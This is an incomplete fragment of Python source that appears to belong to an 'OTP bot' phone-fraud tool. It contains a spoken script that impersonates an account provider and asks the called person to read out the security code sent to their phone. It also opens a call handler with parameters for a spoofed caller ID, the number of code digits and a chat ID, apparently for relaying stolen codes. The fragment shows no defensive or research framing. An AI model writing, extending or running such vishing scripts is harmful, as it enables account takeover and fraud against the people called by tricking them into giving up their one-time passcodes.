...
PAYLOAD_DTMF_ONE = "In order to block this request, please in a clear tone, read out the security code that we have sent to your mobile device. This is to verify ownership of your account. Once completed please dial 2."
...
async def email(data: dict, module: str, call_variables: str, event: str, channel_id: str, number: str, spoof: str, service: str, name: str, otpdigits: str, chatid: str, tag: str):
    if event == "Dial":
